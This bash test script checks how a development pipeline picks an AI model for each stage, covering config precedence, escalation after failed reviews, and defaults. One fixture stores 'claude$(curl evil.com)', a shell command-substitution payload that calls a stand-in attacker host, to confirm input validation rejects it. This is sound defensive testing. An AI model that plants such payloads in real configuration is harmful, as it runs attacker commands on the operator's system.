#!/usr/bin/env bash
# Tests for ENG-103 per-stage model tiering.
#
# Two helpers in bin/run-stage.sh:
#   _resolve_dispatch_model <stage> <ident>
#     → stdout = resolved model literal (or empty)
#     Precedence (highest → lowest):
#       1. .pipeline-config/config.json::dispatch.model[<stage>]
#       2. Escalation override on implementing/ui when
#          _count_loopback_rejections_for_stage >= 1.
#       3. Built-in default table (D-001).
#       4. Unset → empty stdout.
#   _count_loopback_rejections_for_stage <ident> <stage>
#     → stdout = integer count of `verdict result=fail target=<stage>`
#       markers newer than the most recent `transition ... to=<stage>` comment.
#
# Test pattern (per CLAUDE.md "How tests work"): source run-stage.sh after
# stubbing $SCRIPT_DIR/linear.sh so the helper's `bash "$SCRIPT_DIR/linear.sh"
# get-comments` calls hit the stub. The test sentinel in run-stage.sh
# (`if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then main "$@"; fi`) prevents
# main() from firing on source.

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

export PIPELINE_DRY_RUN=1
: "${LINEAR_API_KEY:=test-mock-key}"
export LINEAR_API_KEY
export PROJECT_SLUG="${PROJECT_SLUG:-test-slug}"

# ─── Temp dirs ──────────────────────────────────────────────────────────
_TEST_TARGET_DIR="$(mktemp -d)"
_TEST_STUB_DIR="$(mktemp -d)"

_test_assert_temp_path() {
  case "$1" in
    /var/folders/*|/tmp/*|/private/var/folders/*|/private/tmp/*) return 0 ;;
    *) printf 'REFUSING: path %q is not a platform temp dir\n' "$1" >&2; exit 99 ;;
  esac
}
_test_assert_temp_path "$_TEST_TARGET_DIR"
_test_assert_temp_path "$_TEST_STUB_DIR"

_test_safe_rm() {
  local path="$1"
  case "$path" in
    /var/folders/*|/tmp/*|/private/var/folders/*|/private/tmp/*)
      rm -rf "$path" ;;
    *)
      printf 'SAFETY: trap refusing rm -rf %q (not a temp dir)\n' "$path" >&2 ;;
  esac
}
trap '_test_safe_rm "$_TEST_STUB_DIR"; _test_safe_rm "$_TEST_TARGET_DIR"' EXIT

# ─── Minimal target-repo scaffold ────────────────────────────────────────
export TARGET_REPO="$_TEST_TARGET_DIR"
mkdir -p "$TARGET_REPO/.pipeline-config/schemas"

# Default config (no dispatch.model section). Per-fixture overrides write a
# fresh config.json below.
_write_default_config() {
  jq -n '{
    project: { slug: "test-slug" },
    linear: {
      team_id: "team-test",
      project_id: "proj-test",
      stage_label_prefix: "stage:",
      native_states: { inbox: "Todo", active: "In Progress", done: "Done" },
      workflow_stages: ["brainstorming","planning","implementing","ui","reviewing","qa","building","released"]
    },
    orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5 }
  }' > "$TARGET_REPO/.pipeline-config/config.json"
}
_write_default_config

jq -n '{ labels: {}, states: {} }' > "$TARGET_REPO/.pipeline-config/schemas/linear-ids.json"

export HARNESS_STATE_DIR="$_TEST_STUB_DIR/state"
export PROJECT_STATE_DIR="${HARNESS_STATE_DIR}/${PROJECT_SLUG}"
mkdir -p "$PROJECT_STATE_DIR"

# ─── Stub linear.sh ──────────────────────────────────────────────────────
# get-comments returns the JSON body of $_FIXTURE_COMMENTS_FILE (default
# empty array). Other subcommands are no-ops.
_FIXTURE_COMMENTS_FILE="$_TEST_STUB_DIR/fixture-comments.json"
printf '[]' > "$_FIXTURE_COMMENTS_FILE"

cat > "$_TEST_STUB_DIR/linear.sh" <<SH
#!/usr/bin/env bash
case "\${1:-}" in
  get-comments)
    cat "$_FIXTURE_COMMENTS_FILE" 2>/dev/null || printf '[]'
    ;;
  *)
    : # swallow other subcommands silently
    ;;
esac
exit 0
SH
chmod +x "$_TEST_STUB_DIR/linear.sh"

# ─── Source run-stage.sh (no main due to sentinel) ───────────────────────
# common.sh + classify-failure.sh + dispatch.sh + run-stage.sh together
# provide the helper plus parse_pipeline_marker (sourced via common.sh's
# export -f) and issue_dir.
# shellcheck source=common.sh
source "$SCRIPT_DIR/common.sh"
# shellcheck source=classify-failure.sh
source "$SCRIPT_DIR/classify-failure.sh"
# shellcheck source=dispatch.sh
source "$SCRIPT_DIR/dispatch.sh"
# shellcheck source=run-stage.sh
source "$SCRIPT_DIR/run-stage.sh"

# Re-point SCRIPT_DIR at the stub dir AFTER sourcing so the helper's
# `bash "$SCRIPT_DIR/linear.sh"` calls resolve to the stub.
SCRIPT_DIR="$_TEST_STUB_DIR"

# ─── Assertion helpers ───────────────────────────────────────────────────
PASS=0; FAIL=0
pass_at() { printf '  PASS %s\n' "$1"; PASS=$((PASS+1)); }
fail_at() { printf '  FAIL %s\n      %s\n' "$1" "$2" >&2; FAIL=$((FAIL+1)); }

# Helper: set per-fixture config.json::dispatch.model[<stage>] = <value>.
# Pass "" to omit the field (resets to default config).
_set_config_model() {
  local stage="$1" value="$2"
  if [[ -z "$value" ]]; then
    _write_default_config
    return 0
  fi
  jq --arg s "$stage" --arg v "$value" \
     '. + { dispatch: { model: { ($s): $v } } }' \
     "$TARGET_REPO/.pipeline-config/config.json" > "$TARGET_REPO/.pipeline-config/config.json.tmp"
  mv "$TARGET_REPO/.pipeline-config/config.json.tmp" "$TARGET_REPO/.pipeline-config/config.json"
}

# Like _set_config_model but writes a raw JSON value (integer, etc.) instead
# of quoting it as a string. Used by fixture #14 (jq integer).
_set_config_model_raw() {
  local stage="$1" raw="$2"
  jq --arg s "$stage" --argjson v "$raw" \
     '. + { dispatch: { model: { ($s): $v } } }' \
     "$TARGET_REPO/.pipeline-config/config.json" > "$TARGET_REPO/.pipeline-config/config.json.tmp"
  mv "$TARGET_REPO/.pipeline-config/config.json.tmp" "$TARGET_REPO/.pipeline-config/config.json"
}

# Helper: write a fixture comments JSON to $_FIXTURE_COMMENTS_FILE.
# $1 = JSON array literal.
_set_fixture_comments() {
  printf '%s' "$1" > "$_FIXTURE_COMMENTS_FILE"
}

# Helper: assert _resolve_dispatch_model output. Pass empty string for
# expected to assert "no model resolved".
_assert_resolve() {
  local desc="$1" stage="$2" ident="$3" expected="$4"
  local actual
  actual="$(_resolve_dispatch_model "$stage" "$ident" 2>/dev/null || true)"
  if [[ "$actual" == "$expected" ]]; then
    pass_at "$desc"
  else
    fail_at "$desc" "stage=$stage ident=$ident expected='$expected' actual='$actual'"
  fi
}

# Helper: build a comments JSON for the escalation predicate.
# Each entry of the input lines is "TIMESTAMP|BODY" so the test can stage
# transition + verdict comments in chronological order.
_mk_comments() {
  # stdin: lines of "TS|BODY". stdout: JSON array.
  jq -nR '[inputs | capture("(?<ts>[^|]+)\\|(?<body>.+)") | {createdAt: .ts, body: .body}]'
}

# ─── Counter fixtures (A–C): _count_loopback_rejections_for_stage ────────
# These isolate the counter from the resolver's case-statement so a
# regression in either is localized.
printf '\n--- ENG-103 counter fixtures (A-C) ---\n'

# Fixture A: no comments → 0.
_set_fixture_comments '[]'
_count_A="$(_count_loopback_rejections_for_stage ENG-CNT-A implementing 2>/dev/null || true)"
if [[ "$_count_A" == "0" ]]; then
  pass_at "counter-A: empty comments → 0"
else
  fail_at "counter-A: empty comments" "expected=0 actual='$_count_A'"
fi

# Fixture B: one verdict.fail.target=implementing AFTER the most recent
# transition.to=implementing → 1.
_FIXB_COMMENTS="$(
  printf '%s\n' \
    '2026-05-15T10:00:00Z|<!-- pipeline: transition from=planning to=implementing reason=plan-complete -->' \
    '2026-05-15T11:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=merge-conflict -->' \
  | _mk_comments)"
_set_fixture_comments "$_FIXB_COMMENTS"
_count_B="$(_count_loopback_rejections_for_stage ENG-CNT-B implementing 2>/dev/null || true)"
if [[ "$_count_B" == "1" ]]; then
  pass_at "counter-B: one verdict.fail AFTER transition → 1"
else
  fail_at "counter-B" "expected=1 actual='$_count_B'"
fi

# Fixture C: one verdict.fail.target=implementing OLDER than the most recent
# transition.to=implementing → 0 (counter rule resets after the transition).
_FIXC_COMMENTS="$(
  printf '%s\n' \
    '2026-05-15T09:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=stale -->' \
    '2026-05-15T10:00:00Z|<!-- pipeline: transition from=planning to=implementing reason=plan-complete -->' \
  | _mk_comments)"
_set_fixture_comments "$_FIXC_COMMENTS"
_count_C="$(_count_loopback_rejections_for_stage ENG-CNT-C implementing 2>/dev/null || true)"
if [[ "$_count_C" == "0" ]]; then
  pass_at "counter-C: verdict.fail OLDER than transition → 0 (rule resets)"
else
  fail_at "counter-C" "expected=0 actual='$_count_C'"
fi

# ─── Resolver fixtures (1-16): _resolve_dispatch_model ─────────────────
printf '\n--- ENG-103 resolver fixtures (1-16) ---\n'

# Fixture #1: brainstorming default = claude-opus-4-7.
_write_default_config
_set_fixture_comments '[]'
_assert_resolve "fixture-1: brainstorming default = claude-opus-4-7" \
  brainstorming ENG-FIX-1 'claude-opus-4-7'

# Fixture #2: planning default = claude-opus-4-7.
_assert_resolve "fixture-2: planning default = claude-opus-4-7" \
  planning ENG-FIX-2 'claude-opus-4-7'

# Fixture #3: implementing default + no config + count=0.
# D-008-aware: initial commit ships implementing default = claude-opus-4-7
# (stays Opus until ENG-101 stabilises). Flip the expected literal here to
# claude-sonnet-4-6 in the same commit that flips Task 2's case-statement.
_assert_resolve "fixture-3: implementing default (D-008: still Opus until ENG-101 ships)" \
  implementing ENG-FIX-3 'claude-opus-4-7'

# Fixture #4: implementing + count=1 → escalation to opus.
# On initial commit this matches the D-008 default; serves as a regression
# sentinel proving the escalation predicate path actually executes (vs.
# silently breaking and the default still firing).
_FIX4_COMMENTS="$(
  printf '%s\n' \
    '2026-05-15T10:00:00Z|<!-- pipeline: transition from=building to=implementing reason=merge-conflict -->' \
    '2026-05-15T11:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=merge-conflict -->' \
  | _mk_comments)"
_set_fixture_comments "$_FIX4_COMMENTS"
_assert_resolve "fixture-4: implementing + count=1 → escalated to claude-opus-4-7" \
  implementing ENG-FIX-4 'claude-opus-4-7'

# Fixture #5: implementing + count=3 → still claude-opus-4-7 (no cliff).
_FIX5_COMMENTS="$(
  printf '%s\n' \
    '2026-05-15T10:00:00Z|<!-- pipeline: transition from=planning to=implementing reason=plan-complete -->' \
    '2026-05-15T11:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=r1 -->' \
    '2026-05-15T12:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=r2 -->' \
    '2026-05-15T13:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=r3 -->' \
  | _mk_comments)"
_set_fixture_comments "$_FIX5_COMMENTS"
_assert_resolve "fixture-5: implementing + count=3 → escalated to claude-opus-4-7" \
  implementing ENG-FIX-5 'claude-opus-4-7'

# Fixture #6: ui default + count=0 = claude-sonnet-4-6.
_set_fixture_comments '[]'
_assert_resolve "fixture-6: ui default = claude-sonnet-4-6" \
  ui ENG-FIX-6 'claude-sonnet-4-6'

# Fixture #7: ui + count=2 → escalated to claude-opus-4-7.
_FIX7_COMMENTS="$(
  printf '%s\n' \
    '2026-05-15T10:00:00Z|<!-- pipeline: transition from=implementing to=ui reason=impl-complete -->' \
    '2026-05-15T11:00:00Z|<!-- pipeline: verdict result=fail target=ui reason=r1 -->' \
    '2026-05-15T12:00:00Z|<!-- pipeline: verdict result=fail target=ui reason=r2 -->' \
  | _mk_comments)"
_set_fixture_comments "$_FIX7_COMMENTS"
_assert_resolve "fixture-7: ui + count=2 → escalated to claude-opus-4-7" \
  ui ENG-FIX-7 'claude-opus-4-7'

# Fixture #8: reviewing default = claude-opus-4-7.
_set_fixture_comments '[]'
_assert_resolve "fixture-8: reviewing default = claude-opus-4-7" \
  reviewing ENG-FIX-8 'claude-opus-4-7'

# Fixture #9: qa default = claude-sonnet-4-6.
_assert_resolve "fixture-9: qa default = claude-sonnet-4-6" \
  qa ENG-FIX-9 'claude-sonnet-4-6'

# Fixture #10: building default = claude-haiku-4-5-20251001.
_assert_resolve "fixture-10: building default = claude-haiku-4-5-20251001" \
  building ENG-FIX-10 'claude-haiku-4-5-20251001'

# Fixture #11: released → empty (no --model flag).
_assert_resolve "fixture-11: released → empty (no --model flag, subscription default)" \
  released ENG-FIX-11 ''

# Fixture #12: bracketed [1m] config form preserved verbatim.
_set_config_model implementing 'claude-opus-4-7[1m]'
_assert_resolve "fixture-12: config dispatch.model.implementing='claude-opus-4-7[1m]' → preserved verbatim" \
  implementing ENG-FIX-12 'claude-opus-4-7[1m]'

# Fixture #13: config beats escalation (explicit config WINS over override).
_set_config_model implementing 'claude-sonnet-4-6'
_FIX13_COMMENTS="$(
  printf '%s\n' \
    '2026-05-15T10:00:00Z|<!-- pipeline: transition from=planning to=implementing reason=plan-complete -->' \
    '2026-05-15T11:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=r1 -->' \
    '2026-05-15T12:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=r2 -->' \
    '2026-05-15T13:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=r3 -->' \
    '2026-05-15T14:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=r4 -->' \
    '2026-05-15T15:00:00Z|<!-- pipeline: verdict result=fail target=implementing reason=r5 -->' \
  | _mk_comments)"
_set_fixture_comments "$_FIX13_COMMENTS"
_assert_resolve "fixture-13: config beats escalation (operator pin wins over count=5)" \
  implementing ENG-FIX-13 'claude-sonnet-4-6'

# Fixture #14: jq integer (type-mismatched config) → regex rejects → fall
# through to D-008 implementing default = claude-opus-4-7.
_write_default_config
_set_config_model_raw implementing 60
_set_fixture_comments '[]'
_assert_resolve "fixture-14: integer config (60) rejected by regex → falls through to default (D-008: claude-opus-4-7)" \
  implementing ENG-FIX-14 'claude-opus-4-7'

# Fixture #15: rejection OLDER than transition → count = 0, cheap default fires.
# Pre-D-008-flip the implementing default is still Opus; this fixture asserts
# the layer-2 counter excludes the older fail marker. Set ui (which IS Sonnet
# by default) to disambiguate from D-008's Opus default.
_write_default_config
_FIX15_COMMENTS="$(
  printf '%s\n' \
    '2026-05-15T09:00:00Z|<!-- pipeline: verdict result=fail target=ui reason=stale -->' \
    '2026-05-15T10:00:00Z|<!-- pipeline: transition from=implementing to=ui reason=impl-complete -->' \
  | _mk_comments)"
_set_fixture_comments "$_FIX15_COMMENTS"
_assert_resolve "fixture-15: ui + verdict-fail OLDER than transition → cheap default (count resets)" \
  ui ENG-FIX-15 'claude-sonnet-4-6'

# Fixture #16: adversarial shell-meta payload → regex rejects → fall through
# to D-008 implementing default. Use a payload that contains `$()` (NOT in
# regex char class). Set ui to disambiguate from D-008's Opus default.
_set_config_model ui 'claude$(curl evil.com)'
_set_fixture_comments '[]'
_assert_resolve "fixture-16: adversarial \$()-payload rejected by regex → default (claude-sonnet-4-6)" \
  ui ENG-FIX-16 'claude-sonnet-4-6'

# ─── Summary ─────────────────────────────────────────────────────────────
printf '\nrun-stage-model: passed=%d failed=%d\n' "$PASS" "$FAIL"
exit $(( FAIL ? 1 : 0 ))
